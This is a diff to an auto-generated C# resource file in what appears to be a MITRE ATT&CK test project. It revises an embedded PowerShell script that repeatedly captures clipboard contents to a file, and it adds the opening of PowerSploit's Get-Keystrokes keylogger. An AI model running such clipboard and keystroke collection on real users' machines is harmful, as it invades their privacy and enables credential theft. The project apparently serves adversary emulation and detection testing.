@@ -61,27 +61,53 @@ namespace mitre_attack_tests.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to $fileName = &apos;test.txt&apos;
-        ///    do{
+        ///   Looks up a localized string similar to $fileName = &apos;{filename}&apos;
+        /// do{
         ///
         ///        $clipboard_data = Get-Clipboard 
-        ///        Write-Host &quot;About to write the cliepboard text&quot;
-        ///        Write-Host $test
+        ///
+        ///        Write-Host &quot;Copied text: -&quot; + $clipboard_data
+        ///		$clipboard_data = $clipboard_data -replace &apos;[[+*?()\\.]&apos;,&apos;\$&amp;&apos;
+        ///		Write-Host &quot;Copied text: -&quot; + $clipboard_data
         ///        $b =  Select-String -Quiet -Pattern $clipboard_data -Path $fileName
+        ///
         ///        if (-not $b)
         ///        {
         ///            Add-Content -Path $fileName -Value &quot;$clipboard_data&quot;
         ///        }
-        ///        Write-Host &quot;End - the cliepboard text&quot;
-        ///        Write-Host &quot;About to sleep&quot;
-        ///        sleep 3
-        ///        Write-Host &quot;awake&quot;
+        ///        
+        ///		sleep 3
         ///    }
-        ///    while ($clipboard_data - [rest of string was truncated]&quot;;.
+        ///
+        ///    while ($clipboard_data -ne &quot;&quot;).
         /// </summary>
         public static string getclipboarddatatemplate {
             get {
                 return ResourceManager.GetString("getclipboarddatatemplate", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to function Get-Keystrokes {
+        ///&lt;#
+        ///.SYNOPSIS
+        ///
+        ///    Logs keys pressed, time and the active window.
+        ///    
+        ///    PowerSploit Function: Get-Keystrokes
+        ///    Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
+        ///    Revised By: Jesse Davis (@secabstraction)
+        ///    License: BSD 3-Clause
+        ///    Required Dependencies: None
+        ///    Optional Dependencies: None
+        ///    
+        ///.PARAMETER LogPath
+        ///
+        ///    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\k [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string getkeystrokes {
+            get {
+                return ResourceManager.GetString("getkeystrokes", resourceCulture);
             }
         }
     }
